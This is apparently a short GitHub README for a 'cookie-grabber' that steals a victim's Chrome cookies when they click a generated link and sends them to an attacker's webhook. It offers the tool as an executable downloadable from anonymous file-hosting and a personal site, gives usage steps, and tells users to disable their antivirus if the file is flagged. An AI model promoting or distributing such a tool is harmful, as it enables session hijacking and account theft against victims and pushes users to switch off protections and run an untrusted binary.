# cookie-grabber
This is a simple chrome cookie grabber. When your victim clicks on a link their cookies are sent to a webhook.

Cookie Grabber (Sorry I couldn't upload directly to github because its too big.)


Download(27MB): https://anonfiles.com/PfV4sbnfyc/grabber-setup_exe

Or Download from my website if it doesnt work: https://bobsonhaxs.000webhostapp.com

YOU MAY HAVE TO CLICK DOWNLOAD AGAIN IF IT REDIRECTS THE FIRST TIME.

And becuase of the nature of this device, It may be flagged by your antivirus. If so disable your antivirus and try again.

How to use 
1. Run grabber-setup.exe 
2. Put in the webhook from the channel you want to receive cookies from.

Now it will return a link that you can copy paste and the victims info will be sent to that webhook.
